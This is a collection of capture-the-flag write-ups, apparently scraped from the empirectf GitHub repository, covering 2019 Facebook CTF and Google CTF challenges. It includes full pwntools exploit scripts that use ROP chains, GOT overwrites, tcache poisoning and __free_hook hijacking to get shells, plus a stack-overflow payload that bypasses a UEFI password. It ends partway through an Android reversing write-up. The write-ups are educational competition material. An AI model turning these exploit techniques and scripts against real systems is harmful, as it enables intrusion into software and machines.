range from `-0x30 to 0x30` first. We only need to test the page size (0x1000) multiples because `vm_mem` is always page aligned.\n\nFinally, I found the `i` to be `-0x13`.\n\nThen it is time to write final shellcode!\n\n```assembly\nmov rdi,atoi_got\nxor rax,rax\nmov al,0x76\ncall rax ; leak address of atoi\nxor rax,rax\nmov al,0x69\nmov rdi,strcasestr_got\npush 0x41\npop rsi\ncall rax ; rewrite strcasestr to atoi\nmov rdi,strcasestr_got\nxor rax,rax\nmov al,0x76\ncall rax ; check it is indeed rewritten (actually not needed)\nmov rax,0xffffffff989e9399\nxor rax,0xffffffffffffffff\npush rax\nmov rdi,rsp\nxor rax,rax\nmov al,0x87\ncall rax ; cat flag\nthis:\njmp this ; used to debug: make sure everything is executed\n```\n\nTo debug the shellcode remotely (because our MacOS machine has no `socat`), `this: jmp this` is very important: if the program finally got stuck, it shows that our shellcode is executed without any crash; if not, it shows that something is wrong.\n\nNote the shellcode should be without `0`.\n\nHere is the final [exploit](files/exp.py).\n\n", "timestamp": "2025-10-24T11:39:24.970417"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-06-01-Facebook-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-06-01-Facebook-CTF/README.md", "content": "## 100 Pwn / overfloat\n\nEasy and simple stack overflow, the trick is `unpack(\"<f\", payload[i:i+4])[0]` to convert `DWORD` to floating point number and `\"%.70f\" % f` to convert floating point number to string with enough precision.\n\n```python\nfrom pwn import *\nfrom struct import unpack\ng_local=1\ncontext(log_level='debug', arch='amd64')\np = ELF(\"./overfloat\")\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\n\nif g_local:\n\tsh = process(\"./overfloat\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"challenges.fbctf.com\", 1341)\n\n\ndef to_float_arr(payload):\n\tret = []\n\tfor i in xrange(0, len(payload), 4):\n\t\tret.append(unpack(\"<f\", payload[i:i+4])[0])\n\treturn ret\n\npop_rdi = p64(0x400a83)\n\npayload = 'A' * 0x38\npayload += pop_rdi\npayload += p64(p.got[\"puts\"])\npayload += p64(p.plt[\"puts\"])\npayload += p64(p.symbols[\"main\"])\n\n\ndef exploit(arr):\n\tsh.recvuntil(\"LIKE TO GO?\\n\")\n\tfor f in arr:\n\t\tsh.recvuntil(\": \")\n\t\tsh.sendline(\"%.70f\" % f)\n\tsh.recvuntil(\": \")\n\tsh.sendline(\"done\")\n\tsh.recvuntil(\"BON VOYAGE!\\n\")\n\nexploit(to_float_arr(payload))\nlibc_addr = u64(sh.recvuntil('\\x7f\\n')[:-1] + '\\x00\\x00') - e.symbols[\"puts\"]\nprint hex(libc_addr)\n\npayload = 'A' * 0x38\npayload += p64(libc_addr + 0x4f322)\npayload += '\\x00' * 0x70\n\nexploit(to_float_arr(payload))\n\nsh.interactive()\n```\n\n## 410 Pwn / otp_server\n\nArray out of bound caused by use of `snprintf`, because the `snprintf` will return length that \"would have been written\" not length that will be written, and there is no null byte termination. Then we need to brute force the most significant byte of 4-byte random number, which is a bit time-consuming, and requires about `6*256` times brute force to rewrite return address to one gadget.\n\n```python\nfrom pwn import *\nfrom struct import unpack\ng_local=1\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\n\nif g_local:\n\tsh = process(\"./otp_server\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"challenges.fbctf.com\", 1338)\n\nsh.recvuntil(\">>> \")\n\ndef set_key(key):\n\tsh.sendline('1')\n\tsh.recvuntil(\"Enter key:\\n\")\n\tsh.send(key)\n\ndef encrypt(msg):\n\tsh.sendline('2')\n\tsh.recvuntil(\"message to encrypt:\\n\")\n\tsh.send(msg)\n\tend_msg = \"\\n----- END ROP ENCRYPTED MESSAGE -----\\n\"\n\tsh.recvuntil(\"----- BEGIN ROP ENCRYPTED MESSAGE -----\\n\")\n\treturn sh.recvuntil(end_msg)[:-len(end_msg)]\n\nset_key('K' * 0x80)\nleak = encrypt('M' * 0x100)\n\ncanary = u64(leak[0x108:0x110])\nprog_addr = u64(leak[0x110:0x118]) - 0xdd0\nlibc_addr = u64(leak[0x118:0x120]) - 0x21b97\nprint hex(canary),hex(prog_addr),hex(libc_addr)\n\ndef write_byte(off, val):\n\tset_key('K' * (off + 1) + '\\x00')\n\twhile True:\n\t\tret = encrypt('M')\n\t\tk = ord('K') if off != 2 else 0\n\t\tif ord(ret[3]) ^ k == val:\n\t\t\tbreak\n\none_gadget = p64(libc_addr + 0x10a38c)\n\nfor i in range(0x10, 0x16)[::-1]:\n\twrite_byte(i, ord(one_gadget[i-0x10]))\nsh.interactive()\n```\n\n## 494 Pwn / rank\n\nIt is array out of bound again, but we can only write 32-bit integer which will be signed extended to 64-bit integer, which means that address like `0x7fxxxxxxxxxx` cannot be written. My approach is to use `strtol`, which can give 64-bit control of `rax`, then use gadget `mov [xxx], rax` to rewrite got table of `strtol` to `system`, so we can get shell.\n\n```python\nfrom pwn import *\ng_local=1\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\n\nif g_local:\n\tsh = process(\"./r4nk\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"challenges.fbctf.com\", 1339)\n\nsh.recvuntil(\"> \")\n\ndef rank(idx, val, payload=\"\"):\n\tsh.sendline('2')\n\tsh.recvuntil(\"t1tl3> \")\n\tsh.send(str(idx).ljust(0x20, '\\x00') + payload)\n\tsh.recvuntil(\"r4nk> \")\n\tsh.send(str(val) + '\\x00')\n\tsh.recvuntil(\"> \")\n\ndef show(idx):\n\tsh.sendline('1')\n\tsh.recvuntil(\"%i. \" % idx)\n\tret = sh.recvuntil('\\n')\n\tsh.recvuntil(\"> \")\n\treturn ret[:-1]\n\npayload_addr = 0x602120\nrank(0, (payload_addr - 0x602080) / 8, p64(0x602018))\nlibc_addr = u64(show(0) + '\\x00\\x00') - e.symbols[\"write\"]\nprint hex(libc_addr)\n\npop_rbx_rbp = 0x400921\nget_long = 0x4007B0\nstrtol = 0x400610\nstrtol_got = 0x602040\npop_rdi = 0x400b43\nret = 0x400ACD\nrop = []\nrop.append(pop_rdi)\nrop.append(payload_addr)\nrop.append(strtol) # fully control rax\nrop.append(pop_rbx_rbp)\nrop.append(0)\nrop.append(strtol_got)\nrop.append(0x400918) # [strtol_got] = rax\nrop += [0] * 3\nrop.append(ret)\nrop.append(get_long) # system(\"/bin/sh\")\n\nfor i in xrange(len(rop)):\n\trank(0x88 / 8 + i, rop[i], str(libc_addr + e.symbols[\"system\"]))\n\nsh.sendline('3')\nsh.recvuntil(\"g00dBy3\\n\")\nsh.send(\"/bin/sh\\x00\")\n\nsh.interactive()\n```\n\n## 884 Pwn / babylist\n\nUAF caused by shadow copy of `std::vector`, because as `std::vector` extends and buffer is not enough, the buffer will be freed and a new buffer with twice size will be allocated. `0x90` is a good chunk size to leak `libc` as it will be allocated by array used by `std::vector` and is also the size of the structure that contains `char name[] + std::vector`. Then, use the same trick to cause double free and poison the `tcache`, so we can rewrite `__free_hook`.\n\n```python\nfrom pwn import *\nfrom struct import unpack\ng_local=1\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\n\nif g_local:\n\tsh = process(\"./babylist\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"challenges.fbctf.com\", 1343)\n\ndef create_list(name):\n\tsh.sendline('1')\n\tsh.recvuntil(\"name for list:\\n\")\n\tsh.sendline(name)\n\tsh.recvuntil(\"> \")\ndef add_elem(idx, num):\n\tnum = unpack(\"<i\", p32(num))[0]\n\tsh.sendline('2')\n\tsh.recvuntil(\"index of list:\\n\")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"number to add:\\n\")\n\tsh.sendline(str(num))\n\tsh.recvuntil(\"> \")\ndef view_elem(idx, ii):\n\tsh.sendline('3')\n\tsh.recvuntil(\"index of list:\\n\")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"index into list:\\n\")\n\tsh.sendline(str(ii))\n\tsh.recvuntil(\"] = \")\n\tret = sh.recvuntil('\\n')[:-1]\n\tsh.recvuntil(\"> \")\n\treturn int(ret, 10) & 0xffffffff\ndef dup_list(idx, name):\n\tsh.sendline('4')\n\tsh.recvuntil(\"index of list:\")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"name for new list:\")\n\tsh.sendline(name)\n\tsh.recvuntil(\"> \")\ndef remove(idx):\n\tsh.sendline('5')\n\tsh.recvuntil(\"index of list:\\n\")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"> \")\n\nsh.recvuntil(\"> \")\ncreate_list('0' * 0x20)\nfor i in xrange(0x20):\n\tadd_elem(0, i+1)\nfor i in xrange(8):\n\tdup_list(0, str(i+1) * 0x20)\nfor i in xrange(7):\n\tremove(i+2) # fill 0x90 tcache\nfor i in xrange(3):\n\tadd_elem(0, i+1) # extend, cause UAF\nlibc_addr = view_elem(1, 0) + \\\n\t(view_elem(1, 1) << 0x20) - \\\n\t0x3ebca0\nprint hex(libc_addr)\n# 0 and 1 are used\n\ncreate_list('2' * 0x30)\nfor i in xrange(3):\n\tadd_elem(2, i+1)\ndup_list(2, \"dup1\") # 3\ndup_list(2, \"dup2\") # 4\n\ncreate_list(\"writefd\") # 5\nfh = libc_addr + e.symbols[\"__free_hook\"]\nadd_elem(5, fh % 0x100000000)\n# so next add_elem will allocate 0x20 chunk\n\nfor i in xrange(4):\n\tadd_elem(3, i+1) # free 0x20 chunk\nfor i in xrange(4):\n\tadd_elem(4, i+1) # double free 0x20 chunk\n# now 0x20 bin poisoned\n\nadd_elem(5, fh >> 0x20)\n\nsys = libc_addr + e.symbols[\"system\"]\n\ncreate_list(\"consume\") # 6\ncreate_list(\"consume\") # 7\nadd_elem(6, u16('sh'))\nadd_elem(7, sys % 0x100000000)\nadd_elem(7, sys >> 0x20) # allocate to __free_hook\n\nsh.sendline('2')\nsh.recvuntil(\"index of list:\\n\")\nsh.sendline(str(6))\nsh.recvuntil(\"number to add:\\n\")\nsh.sendline('0') # system(\"sh\")\n\nsh.interactive()\n```\n\n## 985 Pwn / asciishop\n\nThe vulnerability is `-0x80000000 == 0x80000000`, which is still a negative number. We can set this as the `offset` of the image, so we can have bypass all checks and achieve OOB read and write. However, unfortunately when used as index, integer will be converted to `uint16_t`, so we can only access memory `0x10000` after the memory allocated by `mmap`. \n\nAfter inspecting the memory map, I found that only `ld.so` is after the `mmap` region. The offset from `ld.so` to `mmap` region is constant at each run but may vary on different computer (the remote offset is `+0x1000` higher than mine). We can leak the `libc` by reading got table of `ld.so`, but how to control `rip` by writing memory in `ld.so`? The key is when `exit` function is called, at `ld.so+0x10a09`, there is a `lea rdi, [rip + 0x217f5f]; call qword ptr [rip + 0x218551]`, and these 2 addressed are both in `ld.so` and can be overwritten. Therefore, if we rewrite the first one to `\"/bin/sh\"` and second one to `system`, we can execute `system(\"/bin/sh\")`.\n\nBy the way, the way this author implements `print_grid` is very inelegant: bytes are signed extended so `ffffff` will be produced if the `char` are negative, and there is also ambiguity of output `1-f`. Also, stack protector of `llvm` is enabled, which I don't know why and this does not affect my exploitation, maybe my approach is unintended? \n\n```python\nfrom pwn import *\nfrom struct import unpack\ng_local=1\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\n\nif g_local:\n\tsh = process(\"./asciishop\")\n\tOFF = 0\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"challenges.fbctf.com\", 1340)\n\tOFF = 0x1000\n\ndef upload(imgid, img):\n\tsh.sendline(\"1\")\n\tsh.recvuntil(\"id: \")\n\tsh.sendline(str(imgid))\n\tsh.recvuntil(\"ascii\\n\")\n\tsh.send(img.ljust(0x410, '\\x00'))\n\tsh.recvuntil(\">>> \")\n\ndef shop():\n\tsh.sendline(\"4\")\n\tsh.recvuntil(\">>> \")\n\ndef touch(imgid):\n\tsh.sendline(\"1\")\n\tsh.recvuntil(\"Ascii id: \")\n\tsh.sendline(str(imgid))\n\tsh.recvuntil(\">>> \")\n\ndef shop_then_touch(imgid):\n\tshop()\n\ttouch(imgid)\n\ndef back():\n\tsh.sendline(\"4\")\n\tsh.recvuntil(\">>> \")\n\ndef change_pixel(x,y,v):\n\tsh.sendline(\"1\")\n\tsh.recvuntil(\"pixel: \")\n\tsh.sendline(\"(%d, %d) %c\" % (x,y,v))\n\tsh.recvuntil(\">>> \")\n\ndef parse_byte(l):\n\tif len(l) == 1:\n\t\tl = ord(l)\n\t\tif l >= ord('1') and l <= ord('9') or \\\n\t\t\tl >= ord('a') and l <= ord('f'):\n\t\t\treturn int(chr(l), 16)\n\t\telse:\n\t\t\treturn l\n\telse:\n\t\treturn int(l, 16) & 0xff\n\ndef get_address(s):\n\tprint \"----------\" + s\n\tarr = s.split(' ')\n\tret = 0\n\tfor c in arr[::-1]:\n\t\tif len(c) != 0:\n\t\t\tprint c\n\t\t\tparse_byte(c)\n\t\t\tret <<= 8\n\t\t\tret |= parse_byte(c)\n\treturn ret\n\n\ndef print_grid(line):\n\tsh.sendline(\"2\")\n\tsh.recvuntil((\"%2d\" % line) + \" | \")\n\tret = get_address(sh.recvuntil(\" 7f\"))\n\treturn ret\n\n\nimg_header = p32(0x49435341) + p32(0x20) + p32(0x20)\nsh.recvuntil(\">>> \")\nupload(0, img_header + p32(0x80000000))\nupload(1, img_header + p32(0))\nshop_then_touch(0)\nld_leak_off = 0xabe8 + OFF\nchange_pixel(0x418, 0, ld_leak_off & 0xff)\nchange_pixel(0x419, 0, ld_leak_off >> 8)\nback()\ntouch(1)\nlibc_addr = print_grid(0) - e.symbols[\"malloc\"]\nprint hex(libc_addr)\n\nback()\ntouch(0)\nsys_addr = p64(libc_addr + e.symbols[\"system\"])[:6]\nbinsh = \"/bin/sh\"\nfor i in xrange(len(sys_addr)):\n\tchange_pixel(0xbf44+OFF+i, 0, ord(sys_addr[i]))\nfor i in xrange(7):\n\tchange_pixel(0xb94c+OFF+i, 0, binsh[i])\n\nsh.interactive()\n```\n## 738 Reverse / matryoshka\n\nThis challenge is not hard, a `png` file is downloaded from a IP address, we can use following script to download the `png`.\n\n```python\nfrom pwn import *\ncontext(log_level='debug')\nip = \"157.230.132.171\"\nsh = remote(ip, 80)\nsh.send(\"GET /pickachu_wut.png HTTP/1.1\\r\\nHost: %s\\r\\n\\r\\n\" % ip)\n\npng = \"\"\nwhile True:\n\ttry:\n\t\ttmp = sh.recv(0x400)\n\texcept Exception as e:\n\t\tbreak\n\tpng += tmp\n\nf = open(\"pkq.png\", \"wb\")\nf.write(png)\nf.close()\n```\n\nThen, after some reverse engineering, I found it is a self modifying code challenge, we can decrypt the code easily using IDA Python. Finally, we use [this](files/solve.c) to get the flag.\n\n", "timestamp": "2025-10-24T11:39:25.799694"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-06-22-Google-CTF-Qualifier/README2.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-06-22-Google-CTF-Qualifier/README2.md", "content": "## 271 Pwn / SecureBoot\n\n### Overview\n\nIn this challenge, a Linux OS is given and what we need to do is boot this OS. However, it seems that secure boot is preventing us from doing so. We then tried to enter BIOS and found that we need to enter a password first. After some reverse engineering, we found that there is a stack overflow when password is obtained from user. By exploiting this vulnerability, we could enter the BIOS, thus disable the secure boot and successfully boot the OS, in which flag can be read.\n\n### Password Interface\n\n**Discovery**\n\nAfter some trials, my teammate [@Retr0id](https://github.com/DavidBuchanan314) found that we can get into a password user interface by pressing `ESC` at the first booting stage (e.i. before secure booting violation error appears). \n\n```\n****************************\n*                          *\n*   Welcome to the BIOS!   *\n*                          *\n****************************\n\nPassword?\n\n```\n\nInteresting! This is very possible to be the key to solve the challenge, and it finally turns out to be true.\n\nThen we need to find the codes corresponding to password processing logic. My teammate [@Retr0id](https://github.com/DavidBuchanan314) has dumped the following PE files using `uefitool`: [secmain.exe](files/secmain.exe) and [uiapp.exe](files/uiapp.exe). However, by searching strings in all files using `strings` command in Linux, we still failed to find strings like `\"Welcome to the BIOS!\"` or `\"Password?\"`. Fortunately, after some investigation, we found them at `uiapp.exe`:\n\n![1561774234313](files/1561774234313.png)\n\nTherefore the reason why `strings` command failed to work is clear: these strings are encoded in `UTF-16LE`, thus cannot be found by `strings` which is used to search `ascii` strings.\n\nBy using cross reference, it was clear that `sub_FE50` is the function to process the input password.\n\n**Reverse Engineering**\n\nFirstly, function `0x13fd` takes strings like `L\"*   Welcome to the BIOS!   *\\n\"` as argument, and there is a `va_start` in its implementation, so I would guess it is `wprintf`, which is just `printf` but argument should be `UTF-18` string.\n\nThen, in `sub_FE50`, global pointers `0x1bc68` and `0x1bc78` are used for indirect function call. By looking for cross references of these 2 variables, we found that they are initialized at function `ModuleEntryPoint(0x8CB4)`. Here we found `0x1bc68` is assigned by `SystemTable` and `0x1bc78` is assigned by `SystemTable->BootServices`. `SystemTable` is the argument passed into `ModuleEntryPoint` and luckily IDA has relative structure information. We change type of `0x1bc68` to `EFI_SYSTEM_TABLE *` and `0x1bc78` to `EFI_BOOT_SERVICES *`, and also names are also changed. There are also some other assignment at this initialization function, their names and types are also modified just in case.\n\n```c\n::SystemTable = SystemTable;  // 0x1bc68\nv2 = SystemTable->BootServices;\nv3 = SystemTable->RuntimeServices;\n::ImageHandle = ImageHandle;\nBootServices = v2;  // 0x1bc78\nRuntimeServices = v3;\n```\n\nAfter type modification, the loop used to obtain one password becomes this, which is certainly more clear:\n\n```c\nwhile ( 1 )\n{\n  while ( 1 )\n  {\n    v8 = ((__int64 (__fastcall *)(EFI_SIMPLE_TEXT_INPUT_PROTOCOL *, \n      EFI_INPUT_KEY *))SystemTable->ConIn->ReadKeyStroke)(\n           SystemTable->ConIn,\n           &input); // try to read a character\n    if ( v8 >= 0 )\n    {\n      if ( input.UnicodeChar )\n        break; // a character has been read\n    }\n    if ( v8 == 0x8000000000000006i64 ) // if no chacacter is read, block and wait for event \n      ((void (__fastcall *)(signed __int64, EFI_EVENT *, char *))BootServices->WaitForEvent)(\n        1i64,\n        &SystemTable->ConIn->WaitForKey,\n        &v6);\n  }\n  if ( input.UnicodeChar == '\\r' )\n    break; // input terminates if '\\r' is received\n  if ( i <= 0x8Bu )\n  { // append the character to result buffer\n    v3 = i++;\n    v7[v3] = input.UnicodeChar;\n  }\n  wprintf(\"*\");\n}\n```\n\nAs its name suggests, `ReadKeyStroke` is used to get a character from user. The second argument is the buffer used to receive the character, the structure of the buffer is shown below.\n\n```c\ntypedef struct {\n  UINT16  ScanCode;\n  CHAR16  UnicodeChar;\n} EFI_INPUT_KEY;\n```\n\nSo we need to change variable `input` to this type in IDA. However, function `ReadKeyStroke` is a non-block function, and return a negative error value when no key is pressed. If so, blocked function `WaitForEvent` will be called to wait for key stroke event, and will return if there is any new event.\n\nAfter reading the input, the input is passed into `0x20A3`, which, by searching constants and by testing using simple string, we found it to be `sha256` hashing algorithm. The result is then compared, and password is correct only if the hash is `DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF`, so it is certainly not possible to find string to satisfy the condition.\n\n```c\nv7[i] = 0;\nwprintf(L\"\\n\");\nsha256_maybe(v7, i, dst); // 0x20A3\nif ( *dst == 0xDEADBEEFDEADBEEFi64\n  && dst[8] == 0xDEADBEEFDEADBEEFi64\n  && dst[16] == 0xDEADBEEFDEADBEEFi64\n  && dst[24] == 0xDEADBEEFDEADBEEFi64 )\n{\n  free(v2);\n  return 1i64; // returning 1 means the password is correct\n}\n```\n\nIn addition, according to my guess, `0x11A8` is `malloc` and `0xC46` is `free`, since `0x11A8` takes a size and returns a pointer being used as that buffer size, and `0xC46` takes a pointer and is called when password interface function terminates. This turns out to be true, because of these codes found in these 2 functions.\n\n```c\n/* \nfunction call chain: malloc -> sub_1199 -> sub_E400\nas the function name `AllocatePool` suggests, \nmemory is allocated, \nwhich means this is probably `malloc`\n*/\n__int64 __usercall sub_E400@<rax>(__int64 a1@<rdi>)\n{\n  __int64 v2; // [rsp+28h] [rbp-10h]\n\n  if ( (BootServices->AllocatePool)(4i64, a1, &v2) < 0 )\n    v2 = 0i64;\n  return v2;\n}\n/*\nfunction call chain: free -> sub_C3C,\nsimilarly, this is probably `free`\n*/\n__int64 __cdecl sub_C3C(void *a1)\n{\n  return ((__int64 (__fastcall *)(void *))BootServices->FreePool)(a1);\n}\n```\n\n**Vulnerability**\n\nThe vulnerability is a stack overflow when obtaining password. The buffer size is `0x80` but the check is `i <= 0x8Bu`, so we can write 12 more bytes. This is the stack layout.\n\n```c\nchar v7[128]; // [rsp+38h] [rbp-B0h]\n__int64 v8; // [rsp+B8h] [rbp-30h]\n_QWORD *dst; // [rsp+C0h] [rbp-28h]\n```\n\n`v8` is used to store return value of function `ReadKeyStroke` and is used only after being reassigned by the return value of that function, so overwriting it is not very useful. However, `dst`, which is used to store the `sha256` result when function `sha256_maybe` is called, can be used to achieve arbitrary write.\n\n### Debug Environment\n\nBefore exploitation, we may need to successfully debug this password interface subroutine. \n\n**Debug Option of QEMU**\n\nTo debug the binary, we need to set `-s` option in QEMU command in file `run.py`, then launch `gdb` in without any argument, and use `target remote localhost:1234` `gdb` command to start debugging.\n\n**Find PE in Memory**\n\nFirst of all, we need to know where `uiapp.exe` PE file is mapped into the memory. We assumed that there is no ASLR first, and that PE file is loaded at page aligned address (so least 12 bits of address should be same as least 12 bits in IDA).\n\nMy approach to find the PE file is to press `ctrl+c` when password need to be inputted. My idea is that since `WaitForEvent` is a blocked function, `ctrl+c` must terminates in this function or its subroutine functions that it calls. If we inspect the stack at this time, we must be able to find the return address of function `WaitForEvent`, which is inside the `uiapp.exe` PE module, and whose least 12 bits must be `f5e`.\n\n![1561902963554](files/1561902963554.png)\n\nFinally, at `rsp+0x120`, we found the return address to be `0x67daf5e`, and if you restart the challenge and repeat these steps, you will find the address to have the same value, which suggests that the ASLR is not enabled. In addition, you can also find that stack address is also a constant value, which is great and a important feature for us to exploit.\n\nTherefore, it is easy for us to calculate the base address: `0x67daf5e - 0xff5e = 0x67cb000`, so we can rebase the program in IDA to make things more convenient.\n\nAlso, after knowing where the PE file is loaded, we can set breakpoint.\n\n### Exploitation\n\n**Idea**\n\nSo, what we can do is to write a `sha256` hash into a arbitrary 4-byte address. Obviously the idea is try to bypass the password verification. Here is how the password interface function is called:\n\n```assembly\n.text:00000000067D4D2F      call    password_FE50\n.text:00000000067D4D34      test    al, al\n.text:00000000067D4D36      jnz     short loc_67D4D49\n```\n\nFirstly, we tried to rewrite the instruction. For example, if we write `jnz` to `jmp`, we can always let this function jump to the branch of correct password. However, according to [this](https://edk2-docs.gitbooks.io/a-tour-beyond-bios-memory-protection-in-uefi-bios/memory-protection-in-uefi.html), it seems that the text memory is protected and not writable, so this approach does not work.\n\nAs I mentioned before, the stack address is not randomized, so why not rewrite return address of password verification function in stack directly? It should be `0x67D4D34`, but if we can modify it to `0x67D4D49`, the control flow will jump to the branch of correct password directly as the password verification returns. To be specific, what we need to do is to rewrite the least significate byte to `\\x49`, which is the first byte since it is little-endian.\n\n**Find Where the Return Address is Stored**\n\nThis is not so hard, what we need to do is to set a breakpoint at the `ret` instruction of the password interface function (e.i. `password_FE50`), and see the current `rsp` value. To be specific, we use command `b *0x67DB0BB`, and enter wrong password for 3 times, then the function will exit and breakpoint can be triggered.\n\n![1561935288179](files/1561935288179.png)\n\nAs shown clearly above, the return address is stored in address `0x7ec18b8`.\n\n**Specific Exploitation**\n\nNow the particular steps are clear. Firstly, we need to use overflow to rewrite the variable `dst` to `0x7ec18b8 - 32 + 1`, so that the last byte of the hash is the least significate byte of return address. Then we need to find a string such that the last byte of its `sha256` hash is `\\x49`. Note that, the actual payload that we are going to send is `'A' * 0x88 + p32(0x7ec18b8 - 32 + 1) + '\\r'`, where the `A` prefix should be modified to make last byte of the hash `\\x49`. However, when the input is used to calculate hash value, actual bytes used is `'A' * (0x80) + p64(0) + p32(0x7ec18b8 - 32 + 1)`. This is because variable `v8` just after the password buffer will be assigned to return value of `ReadKeyStroke`, which is zero at this point.\n\nTherefore, here is the script to obtain the payload prefix:\n\n```python\nimport binascii\nfrom pwn import *\n\nfor i in xrange(0x10000):\n\tpld = hex(i)[2:]\n\tdk = hashlib.sha256(pld + 'A' * (0x80-4) + p64(0) + p32(0x7ec18b8 - 32 + 1)).hexdigest()\n\tdk = binascii.unhexlify(dk)\n\tif ord(dk[31]) == 0x49:\n\t\tprint pld\n```\n\nThere are many outputs, and we just chose `'1010'` as the prefix.\n\nTherefore, finally the payload to be sent as password is this:\n\n```python\nsh.send('1010' + 'A' * 0x84 + p32(0x7ec18b8 - 32 + 1) + '\\r')\n```\n\n### Tackle with BIOS\n\nNow we finally got into BIOS interface. The idea is to disable secure boot here and reboot the OS. However, if we run the script locally, the BIOS interface we get is this:\n\n![BIOS1](files/BIOS1.png)\n\nwhich is very ugly because it print the control characters used to draw UI as raw bytes, I failed to find `pwntool` functionality to make this more readable, but fortunately when this is run remotely the UI can be shown.\n\n![BIOS2](files/BIOS2.png)\n\nOkay, but how can we move the cursor? After some investigation, we found that `sh.send('\\x1b[B')` is equivalent to key `down`, that `sh.send('\\x1b\\x1b')` is equivalent to key `ESC`, and that `sh.send('\\r')` is equivalent to key `Enter`.\n\nThen we have explored this BIOS, and found option to disable secure boot in `Device Manager`, and rebooted the OS successfully in which the flag can be read, which is just a boring process and not worth discussing...\n\nThe final [exploit](files/secureboot.py).", "timestamp": "2025-10-24T11:39:27.063505"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-06-22-Google-CTF-Quals/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-06-22-Google-CTF-Quals/README.md", "content": "# 2019-06-22-Google-CTF-Quals #\n\n[CTFTime link](https://ctftime.org/event/809) | [Website](https://capturetheflag.withgoogle.com/)\n\n---\n\n## Challenges ##\n\n### Reversing ###\n\n - [231 Flaggy Bird](#231-reversing--flaggy-bird)\n - [189 Dialtone](#189-reversing--dialtone)\n - [140 Malvertising](#140-reversing--malvertising)\n\n### Reversing ###\n\n - [271 SecureBoot](#271-Pwn--SecureBoot)\n\n---\n\n## 231 Reversing / Flaggy Bird ##\n\n**Description**\n\n> Overcome insurmountable obstacles then find the secret combination to get the flag.\n\n**Files provided**\n\n - [flaggy-bird.apk](files/flaggy-bird.apk)\n\n**Solution**\n\nIf we emulate the APK in Android Studio, we get a basic platformer where the goal is to navigate a bird to a goal.\n\n> During the CTF, we could not get through the first jump of the second level, but this does not really matter since we managed to eventually get the flag from static analysis.\n\nAs always with an Android APK, we first run it through a [decompiler](https://www.apkdecompilers.com). We can also `unzip` the APK directly to get nicer access to the assets:\n\n```\n$ unzip flaggy-bird.apk\n```\n\nApart from from libGDX files (a game development library for Java) and the usual Android app miscellany, we find the key package `com.google.ctf.game` in the `sources/com/google/ctf/game` directory with these classes:\n\n - [`AndroidLauncher`](files/flaggybird-decompiled/AndroidLauncher.java) - simply starts the app\n - [`Checker`](files/flaggybird-decompiled/Checker.java) -  flag checking\n - [`R`](files/flaggybird-decompiled/R.java) - some unimportant constants\n - [`a`](files/flaggybird-decompiled/a.java) - draws `scenery.png`, the background behind the game\n - [`b`](files/flaggybird-decompiled/b.java) - draws `bird.png`, the player character\n - [`c`](files/flaggybird-decompiled/c.java) - global game state?\n - [`d`](files/flaggybird-decompiled/d.java) - map rendering\n - [`e`](files/flaggybird-decompiled/e.java) - game manager, loads all other objects, loads a native library (`library.so`)\n - [`f`](files/flaggybird-decompiled/f.java) - map decoding, flag input logic\n - [`g`](files/flaggybird-decompiled/g.java) - physics engine, player interactions with flag input\n - [`h`](files/flaggybird-decompiled/h.java) - some interface which can take a string?\n - [`i`](files/flaggybird-decompiled/i.java) - UI and controls\n\nMost of these classes are simple to understand and not very important for solving the challenge. `Checker` and `f` deserve a closer look.\n\n### `Checker`\n\n[`Checker`](files/flaggybird-decompiled/Checker.java) has three byte arrays. `a` has 32 entries, `b` has 16, and `c` has 320. Then three functions, of which one is `nativeCheck`, implemented in a separate `.so` object:\n\n```java\nprivate byte[] a(byte[] bArr, byte[] bArr2) {\n  try {\n    IvParameterSpec ivParameterSpec = new IvParameterSpec(b);\n    SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"AES\");\n    Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n    instance.init(2, secretKeySpec, ivParameterSpec);\n    return instance.doFinal(bArr2);\n  } catch (Exception unused) {\n    return null;\n  }\n}\n\npublic byte[] a(byte[] bArr) {\n  if (nativeCheck(bArr)) {\n    try {\n      if (Arrays.equals(MessageDigest.getInstance(\"SHA-256\").digest(bArr), a)) {\n        return a(bArr, c);\n      }\n    } catch (Exception unused) {}\n  }\n  return null;\n}\n\npublic native boolean nativeCheck(byte[] bArr);\n```\n\nThe second `a` function is presumably the entry point for checking a flag (it is `public`). It:\n\n - takes a byte array\n - performs `nativeCheck` on it\n - checks if the SHA-256 hash of the input is equal to the `a` byte array (the one with 32 elements)\n - the byte array is used as a key for AES-CBC [decryption](https://docs.oracle.com/javase/7/docs/api/constant-values.html#javax.crypto.Cipher.DECRYPT_MODE), with `b` (the 16-element array) used as the IV and `c` (320-element) as the ciphertext\n\nWe don't know very much about the correct input array, but we can check if our input is correct using the SHA-256 hash, which is important. We also don't know what the result of the decryption is used for yet.\n\nNext, we will investigate the `nativeCheck` function, which we can find in [`library.so`](files/flaggybird-decompiled/library.so). We will use the `x86_64` version. After loading the file, we will also add [this great header file](https://gist.github.com/Jinmo/048776db75067dcd6c57f1154e65b868) by Jinmo, which will 